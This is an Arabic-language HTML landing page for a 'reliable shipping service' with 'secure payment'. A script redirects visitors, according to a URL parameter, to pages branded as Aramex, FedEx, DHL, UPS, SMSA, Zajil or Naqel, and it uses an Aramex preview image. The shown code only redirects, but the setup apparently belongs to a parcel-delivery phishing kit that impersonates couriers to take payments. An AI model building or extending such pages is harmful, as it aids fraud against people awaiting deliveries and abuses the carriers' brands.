<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>خدمة شحن موثوقة - نظام دفع آمن</title>
    <meta name="description" content="خدمة شحن موثوقة - تتبع شحنتك وأكمل الدفع بشكل آمن ومحمي" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
    <meta property="og:title" content="خدمة شحن موثوقة - نظام دفع آمن" />
    <meta property="og:description" content="خدمة شحن موثوقة - تتبع شحنتك وأكمل الدفع بشكل آمن ومحمي" />
    <meta property="og:image" content="/og-aramex.jpg" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:image" content="/og-aramex.jpg" />

    <script>
        // Make OG images absolute URLs immediately
        (function() {
            const origin = window.location.origin;
            const ogImage = document.querySelector('meta[property="og:image"]');
            const ogImageSecure = document.querySelector('meta[property="og:image:secure_url"]');
            const twitterImage = document.querySelector('meta[name="twitter:image"]');
            const ogUrl = document.querySelector('meta[property="og:url"]');
            const twitterUrl = document.querySelector('meta[name="twitter:url"]');
            
            if (ogImage && ogImage.content.startsWith('/')) {
                ogImage.content = origin + ogImage.content;
            }
            if (ogImageSecure && ogImageSecure.content.startsWith('/')) {
                ogImageSecure.content = origin + ogImageSecure.content;
            }
            if (twitterImage && twitterImage.content.startsWith('/')) {
                twitterImage.content = origin + twitterImage.content;
            }
            if (ogUrl && !ogUrl.content) {
                ogUrl.content = window.location.href;
            }
            if (twitterUrl && !twitterUrl.content) {
                twitterUrl.content = window.location.href;
            }
        })();
    </script>
</head>
<body>
    <div id="root" style="text-align: center; padding: 100px 20px; font-family: 'Almarai', sans-serif;">
        <h1>جاري التحميل...</h1>
    </div>
    
    <script>
        // Get service from URL params or default to aramex
        const urlParams = new URLSearchParams(window.location.search);
        const service = urlParams.get('service') || 'aramex';
        
        // Supported services mapping
        const services = {
            'aramex': 'aramex.html',
            'fedex': 'fedex.html',
            'dhl': 'dhl.html',
            'ups': 'ups.html',
            'smsa': 'smsa.html',
            'zajil': 'zajil.html',
            'naqel': 'naqel.html'
        };
        
        // Redirect to the correct service
        const targetFile = services[service] || 'aramex.html';
        window.location.href = targetFile;
    </script>
    
    <script type="module" src="/src/main.tsx"></script>
</body>
</html>
